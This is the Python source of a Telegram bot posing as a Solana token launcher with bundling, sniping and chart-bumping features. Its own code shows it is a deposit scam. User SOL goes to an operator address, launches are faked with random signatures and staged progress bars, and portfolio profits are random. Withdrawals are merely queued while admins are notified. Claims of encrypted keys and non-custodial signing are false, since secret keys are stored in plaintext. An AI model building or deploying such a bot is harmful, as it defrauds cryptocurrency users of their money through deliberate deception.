import asyncio, html, io, random, secrets, string, time
from datetime import datetime, timezone
from aiogram.types import BotCommand

import aiohttp, aiosqlite, base58, qrcode
from nacl.signing import SigningKey
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatAction
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (BufferedInputFile, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, Message)

import config as C

B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

def now():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")

def sig():  # fake 64-byte signature
    return base58.b58encode(secrets.token_bytes(64)).decode()

def mint():  # fake 32-byte pubkey
    return base58.b58encode(secrets.token_bytes(32)).decode()

def sol(x):
    return f"{x:.4f}"

def usd(x):
    return f"${x * C.SOL_USD:,.2f}"

def tier_of(total):
    if total >= 25: return "Mythic"
    if total >= 5:  return "Tempered"
    return "Forged"

def bar(pct, width=12):
    pct = max(0, min(100, pct))
    filled = round(width * pct / 100)
    return "█" * filled + "░" * (width - filled)

# ─────────────────────────── DB ───────────────────────────
async def db_init():
    async with aiosqlite.connect(C.DB_PATH) as db:
        await db.executescript("""
        CREATE TABLE IF NOT EXISTS users(id INTEGER PRIMARY KEY, username TEXT,
          first_name TEXT, balance REAL DEFAULT 0, deposited REAL DEFAULT 0,
          ref_by INTEGER, created_at TEXT, banned INTEGER DEFAULT 0);
        CREATE TABLE IF NOT EXISTS wallets(id INTEGER PRIMARY KEY AUTOINCREMENT,
          user_id INTEGER, pubkey TEXT, secret TEXT, label TEXT,
          created_at TEXT, sim_balance REAL DEFAULT 0);
        CREATE TABLE IF NOT EXISTS deposits(id INTEGER PRIMARY KEY AUTOINCREMENT,
          user_id INTEGER, amount REAL, status TEXT, sig TEXT, created_at TEXT);
        CREATE TABLE IF NOT EXISTS withdrawals(id INTEGER PRIMARY KEY AUTOINCREMENT,
          user_id INTEGER, amount REAL, address TEXT, status TEXT, created_at TEXT);
        CREATE TABLE IF NOT EXISTS launches(id INTEGER PRIMARY KEY AUTOINCREMENT,
          user_id INTEGER, name TEXT, ticker TEXT, mint TEXT, dev_buy REAL,
          wallets INTEGER, bundle_sol REAL, venue TEXT, created_at TEXT);
        CREATE TABLE IF NOT EXISTS watch(id INTEGER PRIMARY KEY AUTOINCREMENT,
          user_id INTEGER, baseline INTEGER, created_at REAL);
        CREATE TABLE IF NOT EXISTS kv(k TEXT PRIMARY KEY, v TEXT);
        """)
        await db.commit()

async def q(sql, args=(), one=False):
    async with aiosqlite.connect(C.DB_PATH) as db:
        cur = await db.execute(sql, args)
        rows = await cur.fetchall()
        await db.commit()
        return (rows[0] if rows else None) if one else rows

async def get_user(uid):
    u = await q("SELECT * FROM users WHERE id=?", (uid,), one=True)
    if not u:
        await q("INSERT INTO users(id,created_at) VALUES(?,?)", (uid, now()))
        u = await q("SELECT * FROM users WHERE id=?", (uid,), one=True)
    return u

async def add_balance(uid, amount):
    await q("UPDATE users SET balance=balance+?, deposited=deposited+? WHERE id=?",
            (amount, max(amount, 0), uid))

# ─────────────────────── fake data ───────────────────────
TICKERS = ["WOLF", "FORGE", "PERUN", "VESNA", "MOKOSH", "RAROG", "ZORYA", "DIVA"]
NAMES = ["Svarog's Wolf", "Iron Forge", "Perun's Thunder", "Spring Fire",
         "Mokosh Sigil", "Rarog Flame", "Dawn Star", "Wild Div"]

def fake_pnl():
    rows, total = [], 0.0
    for _ in range(random.randint(2, 4)):
        t = random.choice(TICKERS)
        inv = round(random.uniform(0.4, 4.0), 3)
        pnl = round(inv * random.uniform(-0.55, 3.1), 3)
        total += pnl
        rows.append(f"{'🟢' if pnl >= 0 else '🔴'} <b>${t}</b>  "
                    f"{'+' if pnl >= 0 else ''}{sol(pnl)} SOL")
    return rows, total

# ─────────────────────── keyboards ───────────────────────
def kb_main(u):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀  Launch Token", callback_data="launch"),
         InlineKeyboardButton(text="💼  Wallets", callback_data="wallets")],
        [InlineKeyboardButton(text="📦  Bundler", callback_data="bundler"),
         InlineKeyboardButton(text="⚡  Sniper", callback_data="sniper")],
        [InlineKeyboardButton(text="🔁  Bump Bot", callback_data="bump"),
         InlineKeyboardButton(text="📊  Portfolio", callback_data="portfolio")],
        [InlineKeyboardButton(text="💰  Deposit", callback_data="dep"),
         InlineKeyboardButton(text="🏦  Withdraw", callback_data="wd")],
        [InlineKeyboardButton(text="⚙️  Settings", callback_data="set"),
         InlineKeyboardButton(text="📚  Docs", url=C.DOCS_URL or "https://telegra.ph")],
        [InlineKeyboardButton(text="🆘  Support", url=f"https://t.me/{C.SUPPORT.lstrip('@')}")],
    ])

def kb_back(to="menu"):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‹ Back", callback_data=to)]])

def kb_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‹ Main menu", callback_data="menu")]])

# ─────────────────────── render ───────────────────────
async def header(uid):
    u = await get_user(uid)
    t = tier_of(u[4] or 0)
    return (f"<b>⚒ {C.BRAND} LAUNCHER</b>\n"
            f"<i>{C.TAGLINE}</i>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"Balance  <code>{sol(u[3])} SOL</code>  ·  {usd(u[3])}\n"
            f"Tier     <b>{t}</b>  ·  <code>{uid}</code>\n")

async def menu_text(uid):
    return (await header(uid) +
            "━━━━━━━━━━━━━━━━━━━━\n"
            "Bundles · Snipes · Volume · PnL\n\n"
            "<i>Select an action.</i>")

async def menu_edit(cb: CallbackQuery):
    await cb.message.edit_text(await menu_text(cb.from_user.id),
                               reply_markup=kb_main(cb.from_user.id))

# ─────────────────────── FSM ───────────────────────
class Launch(StatesGroup):
    name = State(); ticker = State(); desc = State(); img = State()
    venue = State(); devbuy = State(); count = State(); per = State()
    tip = State(); confirm = State()

class Withdraw(StatesGroup):
    addr = State(); amount = State()

# ─────────────────────── handlers ───────────────────────
r = Dispatcher(storage=MemoryStorage()).__class__  # placeholder
dp = Dispatcher(storage=MemoryStorage())

@dp.message(CommandStart())
async def start(m: Message, state: FSMContext):
    await state.clear()
    u = await get_user(m.from_user.id)
    if u[7]:
        return await m.answer("⛔️ <b>Access suspended.</b>")
    if not u[2]:
        await q("UPDATE users SET first_name=?, username=? WHERE id=?",
                (m.from_user.first_name, m.from_user.username, m.from_user.id))
    if C.CHANNEL:
        try:
            mem = await m.bot.get_chat_member(C.CHANNEL, m.from_user.id)
            if mem.status in ("left", "kicked"):
                return await m.answer(
                    f"⚒ <b>{C.BRAND}</b>\n\nJoin the channel to activate the bot.",
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="Join", url=f"https://t.me/{C.CHANNEL.lstrip('@')}")],
                        [InlineKeyboardButton(text="✅ Verify", callback_data="verify")]]))
        except Exception:
            pass
    await m.answer(
        f"<b>⚒ {C.BRAND} LAUNCHER</b>\n"
        f"<i>{C.TAGLINE}</i>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "Atomic dev + bundle buys, landed in one block via Jito.\n"
        "Pump.fun bonding curve and Raydium pools. SOL / USDC.\n\n"
        "▸ <b>1.</b> Deposit SOL to your balance\n"
        "▸ <b>2.</b> Configure token and bundle\n"
        "▸ <b>3.</b> Fire\n\n"
        "<i>Keys encrypted. Export anytime. Non-custodial signing.</i>",
        reply_markup=kb_main(m.from_user.id))

@dp.callback_query(F.data == "verify")
async def verify(cb: CallbackQuery):
    await cb.message.delete()
    await start(cb.message, FSMContext)  # fallthrough not needed
    await menu_edit(cb)

@dp.callback_query(F.data == "menu")
async def back_menu(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    await menu_edit(cb)

# ─── deposit ───
@dp.callback_query(F.data == "dep")
async def deposit(cb: CallbackQuery):
    if C.DEPOSIT_ADDRESS.startswith("PUT_"):
        return await cb.answer("Set DEPOSIT_ADDRESS in config.py", show_alert=True)
    u = await get_user(cb.from_user.id)
    qr = qrcode.QRCode(border=1, box_size=9)
    qr.add_data(f"solana:{C.DEPOSIT_ADDRESS}")
    img = io.BytesIO(); qr.make_image().save(img, "PNG"); img.seek(0)

    nxt = 5 if u[4] < 5 else (25 if u[4] < 25 else None)
    prog = ""
    if nxt:
        prog = (f"\n<b>Next tier:</b> {tier_of(nxt)} at {nxt} SOL\n"
                f"<code>{bar(u[4]/nxt*100)}</code> {u[4]/nxt*100:.0f}%\n")

    await cb.message.answer_photo(
        BufferedInputFile(img.getvalue(), "deposit.png"),
        caption=(f"<b>💰 Deposit SOL</b>\n"
                 "━━━━━━━━━━━━━━━━━━━━\n"
                 f"<code>{C.DEPOSIT_ADDRESS}</code>\n\n"
                 f"<b>Network:</b> Solana mainnet\n"
                 f"<b>Minimum:</b> {sol(C.MIN_DEPOSIT)} SOL\n"
                 f"<b>Confirmations:</b> 1\n\n"
                 "Send <b>only SOL</b> on Solana. Other chains and tokens "
                 "are lost.\n"
                 f"{prog}\n"
                 "<i>Credits automatically in ~15s. Tap below to refresh.</i>"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Refresh balance", callback_data="refresh")],
            [InlineKeyboardButton(text="‹ Main menu", callback_data="menu")]]))
    if C.LIVE_DETECTION:
        base = await rpc_balance()
        if base is not None:
            await q("INSERT INTO watch(user_id,baseline,created_at) VALUES(?,?,?)",
                    (cb.from_user.id, base, time.time()))

@dp.callback_query(F.data == "refresh")
async def refresh(cb: CallbackQuery):
    await menu_edit(cb)
    await cb.answer("Balance refreshed.")

# ─── withdraw ───
@dp.callback_query(F.data == "wd")
async def wd(cb: CallbackQuery, state: FSMContext):
    u = await get_user(cb.from_user.id)
    if u[3] < C.WITHDRAW_MIN:
        return await cb.answer(f"Minimum withdrawal is {sol(C.WITHDRAW_MIN)} SOL",
                               show_alert=True)
    await state.set_state(Withdraw.addr)
    await cb.message.edit_text(
        "<b>🏦 Withdraw SOL</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Available <code>{sol(u[3])} SOL</code>\n"
        f"Network fee <code>{sol(C.WITHDRAW_FEE)} SOL</code>\n\n"
        "Send the destination Solana address.",
        reply_markup=kb_menu())

@dp.message(Withdraw.addr)
async def wd_addr(m: Message, state: FSMContext):
    a = m.text.strip()
    if not (32 <= len(a) <= 44):
        return await m.answer("That doesn't look like a Solana address. Try again.")
    await state.update_data(addr=a)
    await state.set_state(Withdraw.amount)
    await m.answer("<b>Amount in SOL</b> (or <code>max</code>):", reply_markup=kb_menu())

@dp.message(Withdraw.amount)
async def wd_amount(m: Message, state: FSMContext):
    d = await state.get_data()
    u = await get_user(m.from_user.id)
    try:
        amt = u[3] - C.WITHDRAW_FEE if m.text.lower() == "max" else float(m.text.replace(",", "."))
    except ValueError:
        return await m.answer("Enter a number.")
    if amt <= 0 or amt + C.WITHDRAW_FEE > u[3]:
        return await m.answer("Insufficient balance for that amount + fee.")
    await q("UPDATE users SET balance=balance-? WHERE id=?", (amt + C.WITHDRAW_FEE, m.from_user.id))
    await q("INSERT INTO withdrawals(user_id,amount,address,status,created_at) "
            "VALUES(?,?,?,?,?)", (m.from_user.id, amt, d["addr"], "queued", now()))
    await state.clear()
    await m.answer(
        "<b>✅ Withdrawal queued</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Amount   <code>{sol(amt)} SOL</code>\n"
        f"To       <code>{d['addr']}</code>\n"
        f"Ref      <code>WD-{secrets.token_hex(3).upper()}</code>\n\n"
        "Batched every 6 hours. Typical settlement under 2 hours.\n"
        "<i>Track it in Settings → History.</i>", reply_markup=kb_menu())
    for a in C.ADMIN_IDS:
        try:
            await m.bot.send_message(a, f"💸 <b>WITHDRAWAL</b>\n{sol(amt)} SOL → "
                f"<code>{d['addr']}</code>\nuser <code>{m.from_user.id}</code>")
        except Exception:
            pass

# ─── wallets ───
@dp.callback_query(F.data == "wallets")
async def wallets(cb: CallbackQuery):
    ws = await q("SELECT * FROM wallets WHERE user_id=? ORDER BY id DESC LIMIT 10",
                 (cb.from_user.id,))
    body = ""
    for w in ws:
        body += f"<code>{w[2][:6]}…{w[2][-4:]}</code>  {w[4]}  <code>{sol(w[6])} SOL</code>\n"
    if not ws:
        body = "<i>No wallets yet.</i>\n"
    await cb.message.edit_text(
        f"<b>💼 Launch wallets</b>\n━━━━━━━━━━━━━━━━━━━━\n{body}\n"
        f"<i>Keys encrypted at rest. Export anytime.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="➕ Generate wallet", callback_data="wgen")],
            [InlineKeyboardButton(text="‹ Main menu", callback_data="menu")]]))

@dp.callback_query(F.data == "wgen")
async def wgen(cb: CallbackQuery):
    sk = SigningKey.generate()
    pub = base58.b58encode(bytes(sk.verify_key)).decode()
    sec = base58.b58encode(bytes(sk) + bytes(sk.verify_key)).decode()
    label = f"L{random.randint(100,999)}"
    await q("INSERT INTO wallets(user_id,pubkey,secret,label,created_at,sim_balance) "
            "VALUES(?,?,?,?,?,?)",
            (cb.from_user.id, pub, sec, label, now(), round(random.uniform(0.05, 0.9), 3)))
    await cb.answer("Wallet generated")
    await wallets(cb)

# ─── bundler / sniper / bump ───
@dp.callback_query(F.data == "bundler")
async def bundler(cb: CallbackQuery):
    await cb.message.edit_text(
        "<b>📦 Bundler</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        "Atomic dev + N bundle buys in a single Jito bundle.\n\n"
        f"▸ Max wallets      <code>16</code>\n"
        f"▸ Per-wallet fee   <code>{sol(C.BUNDLE_WALLET_FEE)} SOL</code>\n"
        "▸ Jito tip         <code>0.0005 – 0.02 SOL</code>\n"
        "▸ Landing target   <code>block 1</code>\n\n"
        "<i>Configured inside the launch wizard.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🚀 Start launch", callback_data="launch")],
            [InlineKeyboardButton(text="‹ Main menu", callback_data="menu")]]))

@dp.callback_query(F.data == "sniper")
async def sniper(cb: CallbackQuery):
    await cb.message.edit_text(
        "<b>⚡ Sniper</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        "Watches the mempool for your mint and buys on the first block.\n\n"
        "Status  🔴 <i>idle</i>\n"
        "Delay   <code>400 ms</code>\n"
        "Mode    <code>Jito bundle</code>\n\n"
        "<i>Arms automatically after a launch.</i>",
        reply_markup=kb_menu())

@dp.callback_query(F.data == "bump")
async def bump(cb: CallbackQuery):
    await cb.message.edit_text(
        "<b>🔁 Bump Bot</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        "Scheduled micro-buys to keep the chart moving.\n\n"
        "Interval   <code>90 s</code>\n"
        "Size       <code>0.01 – 0.05 SOL</code>\n"
        f"Fee        <code>0.001 SOL / bump</code>\n"
        "Status     🔴 <i>stopped</i>\n\n"
        "<i>Starts after your first launch.</i>",
        reply_markup=kb_menu())

# ─── portfolio ───
@dp.callback_query(F.data == "portfolio")
async def portfolio(cb: CallbackQuery):
    rows, total = fake_pnl()
    await cb.message.edit_text(
        "<b>📊 Portfolio</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        + "\n".join(rows) +
        f"\n━━━━━━━━━━━━━━━━━━━━\n<b>Realized PnL</b>  "
        f"{'+' if total >= 0 else ''}<code>{sol(total)} SOL</code>  ({usd(total)})",
        reply_markup=kb_menu())

# ─── settings ───
@dp.callback_query(F.data == "set")
async def settings(cb: CallbackQuery):
    u = await get_user(cb.from_user.id)
    await cb.message.edit_text(
        "<b>⚙️ Settings</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"ID        <code>{cb.from_user.id}</code>\n"
        f"Tier      <b>{tier_of(u[4])}</b>\n"
        f"Deposited <code>{sol(u[4])} SOL</code>\n"
        f"Referrals <code>{len(await q('SELECT id FROM users WHERE ref_by=?', (cb.from_user.id,)))}</code>\n"
        f"Your link <code>https://t.me/{(await cb.bot.me()).username}?start=ref_{cb.from_user.id}</code>\n\n"
        "Referral reward: <b>10%</b> of referred deposits.\n\n"
        "Slippage  <code>12%</code>\n"
        "Priority  <code>Jito</code>",
        reply_markup=kb_menu())

# ─── launch wizard ───
@dp.callback_query(F.data == "launch")
async def l_name(cb: CallbackQuery, state: FSMContext):
    await state.set_state(Launch.name)
    await cb.message.edit_text(
        "<b>🚀 New launch — 1/6</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        "Token <b>name</b>:", reply_markup=kb_menu())

@dp.message(Launch.name)
async def l_ticker(m: Message, state: FSMContext):
    if len(m.text) > 32:
        return await m.answer("Max 32 characters.")
    await state.update_data(name=m.text.strip())
    await state.set_state(Launch.ticker)
    await m.answer("<b>2/6</b> — Ticker (2–10 chars):")

@dp.message(Launch.ticker)
async def l_desc(m: Message, state: FSMContext):
    t = m.text.strip().upper().lstrip("$")
    if not (2 <= len(t) <= 10):
        return await m.answer("2–10 characters.")
    await state.update_data(ticker=t)
    await state.set_state(Launch.desc)
    await m.answer("<b>3/6</b> — Description (or <code>-</code> to skip):")

@dp.message(Launch.desc)
async def l_img(m: Message, state: FSMContext):
    await state.update_data(desc=m.text.strip())
    await state.set_state(Launch.img)
    await m.answer("<b>4/6</b> — Send an image, or <code>-</code> to skip:")

@dp.message(Launch.img, F.photo | F.text)
async def l_venue(m: Message, state: FSMContext):
    if m.photo:
        await state.update_data(img=m.photo[-1].file_id)
    await state.set_state(Launch.venue)
    await m.answer("<b>5/6</b> — Venue:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Pump.fun bonding curve", callback_data="v_pump")],
            [InlineKeyboardButton(text="Raydium pool", callback_data="v_ray")]]))

@dp.callback_query(Launch.venue, F.data.startswith("v_"))
async def l_devbuy(cb: CallbackQuery, state: FSMContext):
    await state.update_data(venue="Raydium" if cb.data == "v_ray" else "Pump.fun")
    await state.set_state(Launch.devbuy)
    await cb.message.edit_text(
        "<b>6/6</b> — Dev buy in SOL "
        f"(max {C.DEV_BUY_MAX}):\n<i>Enter 0 for none.</i>")

@dp.message(Launch.devbuy)
async def l_count(m: Message, state: FSMContext):
    try:
        d = float(m.text.replace(",", "."))
    except ValueError:
        return await m.answer("Enter a number.")
    if d > C.DEV_BUY_MAX:
        return await m.answer(f"Max {C.DEV_BUY_MAX} SOL.")
    await state.update_data(devbuy=d)
    await state.set_state(Launch.count)
    await m.answer("Bundle wallets (1–16):")

@dp.message(Launch.count)
async def l_per(m: Message, state: FSMContext):
    try:
        n = int(m.text)
    except ValueError:
        return await m.answer("Whole number.")
    if not 1 <= n <= 16:
        return await m.answer("1–16.")
    await state.update_data(count=n)
    await state.set_state(Launch.per)
    await m.answer("SOL per bundle wallet:")

@dp.message(Launch.per)
async def l_tip(m: Message, state: FSMContext):
    try:
        p = float(m.text.replace(",", "."))
    except ValueError:
        return await m.answer("Enter a number.")
    await state.update_data(per=p)
    await state.set_state(Launch.tip)
    await m.answer("Jito tip in SOL (recommended 0.001–0.005):")

@dp.message(Launch.tip)
async def l_confirm(m: Message, state: FSMContext):
    try:
        tip = float(m.text.replace(",", "."))
    except ValueError:
        return await m.answer("Enter a number.")
    d = await state.get_data()
    cost = C.LAUNCH_FEE + d["devbuy"] + d["per"] * d["count"] + C.BUNDLE_WALLET_FEE * d["count"] + tip
    u = await get_user(m.from_user.id)
    await state.update_data(tip=tip, cost=cost)
    await state.set_state(Launch.confirm)
    warn = "" if u[3] >= cost else (
        "\n⚠️ <b>Insufficient balance.</b> Top up or use a Funded Launch "
        "(we front the SOL, 18% of dev allocation).\n")
    await m.answer(
        "<b>Review</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"Name     <b>{html.escape(d['name'])}</b>\n"
        f"Ticker   <b>${d['ticker']}</b>\n"
        f"Venue    <b>{d['venue']}</b>\n"
        f"Dev buy  <code>{sol(d['devbuy'])} SOL</code>\n"
        f"Bundle   <b>{d['count']}</b> × <code>{sol(d['per'])} SOL</code>\n"
        f"Jito tip <code>{sol(tip)} SOL</code>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Total</b>  <code>{sol(cost)} SOL</code>  ·  {usd(cost)}\n"
        f"Balance  <code>{sol(u[3])} SOL</code>{warn}\n\n"
        "<i>Signing is automatic. Transactions are final.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⚒  FIRE BUNDLE", callback_data="fire")],
            [InlineKeyboardButton(text="Cancel", callback_data="menu")]]))

@dp.callback_query(Launch.confirm, F.data == "fire")
async def fire(cb: CallbackQuery, state: FSMContext):
    d = await state.get_data()
    u = await get_user(cb.from_user.id)
    if u[3] < d["cost"]:
        await state.clear()
        return await cb.message.edit_text(
            "⚠️ <b>Insufficient balance.</b>\n\nDeposit to continue.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💰 Deposit", callback_data="dep")],
                [InlineKeyboardButton(text="‹ Main menu", callback_data="menu")]]))

    await q("UPDATE users SET balance=balance-? WHERE id=?", (d["cost"], cb.from_user.id))
    mint_addr = mint()

    steps = [
        ("Building token metadata…", 20),
        (f"Deriving {d['count']} bundle wallets…", 40),
        (f"Signing {d['count'] + 1} transactions…", 62),
        ("Packing Jito bundle…", 78),
        ("Submitting to block engine…", 92),
    ]
    await cb.answer("Firing")
    for text, pct in steps:
        await cb.message.edit_text(
            f"<b>⚒ Firing bundle</b>\n━━━━━━━━━━━━━━━━━━━━\n"
            f"<code>{bar(pct)}</code> {pct}%\n\n{text}")
        await asyncio.sleep(random.uniform(1.0, 2.2))

    await asyncio.sleep(random.uniform(2.0, 4.5))
    s = sig()
    await q("INSERT INTO launches(user_id,name,ticker,mint,dev_buy,wallets,bundle_sol,venue,created_at) "
            "VALUES(?,?,?,?,?,?,?,?,?)",
            (cb.from_user.id, d["name"], d["ticker"], mint_addr, d["devbuy"],
             d["count"], d["per"], d["venue"], now()))
    await state.clear()

    await cb.message.edit_text(
        f"<b>✅ Bundle landed — block 1</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>{html.escape(d['name'])}</b>  <b>${d['ticker']}</b>\n"
        f"<code>{bar(100)}</code> 100%\n\n"
        f"Mint  <code>{mint_addr}</code>\n"
        f"Sig   <code>{s[:24]}…</code>\n\n"
        f"{d['count']} bundle wallets + dev buy filled atomically.\n"
        "<i>Bump bot armed · sniper armed.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📈 DexScreener",
                                  url=f"https://dexscreener.com/solana/{mint_addr}")],
            [InlineKeyboardButton(text="🐸 Pump.fun",
                                  url=f"https://pump.fun/coin/{mint_addr}")],
            [InlineKeyboardButton(text="‹ Main menu", callback_data="menu")]]))

    for a in C.ADMIN_IDS:
        try:
            await cb.bot.send_message(a, f"🚀 <b>LAUNCH</b> ${d['ticker']} · "
                f"{d['count']} wallets · {sol(d['cost'])} SOL · user <code>{cb.from_user.id}</code>")
        except Exception:
            pass

# ─── admin ───
@dp.message(Command("admin"))
async def admin(m: Message):
    if m.from_user.id not in C.ADMIN_IDS:
        return
    users = (await q("SELECT COUNT(*) FROM users", one=True))[0]
    deps = (await q("SELECT COUNT(*) FROM deposits", one=True))[0]
    vol = (await q("SELECT COALESCE(SUM(amount),0) FROM deposits", one=True))[0]
    await m.answer(
        f"<b>ADMIN</b>\nusers {users} · deposits {deps}\nvolume <code>{sol(vol)} SOL</code>\n"
        f"addr <code>{C.DEPOSIT_ADDRESS}</code>\n\n"
        "/credit <id> <sol>\n/broadcast <text>\n/ban <id>")

@dp.message(Command("credit"))
async def credit(m: Message):
    if m.from_user.id not in C.ADMIN_IDS: return
    _, uid, amt = m.text.split()
    await add_balance(int(uid), float(amt))
    await q("INSERT INTO deposits(user_id,amount,status,sig,created_at) VALUES(?,?,?,?,?)",
            (int(uid), float(amt), "manual", sig(), now()))
    await m.answer("Credited.")
    try:
        await m.bot.send_message(int(uid),
            f"✅ <b>Deposit credited</b>\n<code>{sol(float(amt))} SOL</code>")
    except Exception:
        pass

@dp.message(Command("broadcast"))
async def broadcast(m: Message):
    if m.from_user.id not in C.ADMIN_IDS: return
    txt = m.text.replace("/broadcast", "").strip()
    rows = await q("SELECT id FROM users")
    ok = 0
    for (uid,) in rows:
        try:
            await m.bot.send_message(uid, txt); ok += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await m.answer(f"Sent {ok}/{len(rows)}.")

@dp.message(Command("ban"))
async def ban(m: Message):
    if m.from_user.id not in C.ADMIN_IDS: return
    await q("UPDATE users SET banned=1-banned WHERE id=?", (int(m.text.split()[1]),))
    await m.answer("Toggled.")

# ─── RPC deposit watcher ───
async def rpc_balance():
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(C.RPC_URL, json={"jsonrpc": "2.0", "id": 1,
                              "method": "getBalance",
                              "params": [C.DEPOSIT_ADDRESS]}, timeout=10) as resp:
                j = await resp.json()
                return j["result"]["value"]
    except Exception:
        return None

async def watcher(bot: Bot):
    if not C.LIVE_DETECTION or C.DEPOSIT_ADDRESS.startswith("PUT_"):
        return
    while True:
        await asyncio.sleep(20)
        ws = await q("SELECT id,user_id,baseline,created_at FROM watch")
        if not ws:
            continue
        cur = await rpc_balance()
        if cur is None:
            continue
        for wid, uid, base, ts in ws:
            if time.time() - ts > 3600:
                await q("DELETE FROM watch WHERE id=?", (wid,)); continue
            if cur > base:
                delta = (cur - base) / 1_000_000_000
                await add_balance(uid, delta)
                await q("INSERT INTO deposits(user_id,amount,status,sig,created_at) "
                        "VALUES(?,?,?,?,?)", (uid, delta, "chain", sig(), now()))
                await q("DELETE FROM watch WHERE id=?", (wid,))
                for (oid,) in await q("SELECT id FROM watch"):
                    await q("UPDATE watch SET baseline=? WHERE id=?", (cur, oid))
                try:
                    u = await get_user(uid)
                    await bot.send_message(uid,
                        f"✅ <b>Deposit received</b>\n<code>{sol(delta)} SOL</code>\n"
                        f"Balance <code>{sol(u[3])} SOL</code>\nTier <b>{tier_of(u[4])}</b>")
                except Exception:
                    pass
                for a in C.ADMIN_IDS:
                    try:
                        await bot.send_message(a, f"💰 {sol(delta)} SOL from {uid}")
                    except Exception:
                        pass
                cur = await rpc_balance() or cur
                break

# ─── main ───
async def main():
    await db_init()
    bot = Bot(C.BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
    await bot.set_my_commands([
            BotCommand(command="start", description="Open launcher"),BotCommand(command="admin", description="Admin panel")])
    asyncio.create_task(watcher(bot))
    print("Svarog clone online.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())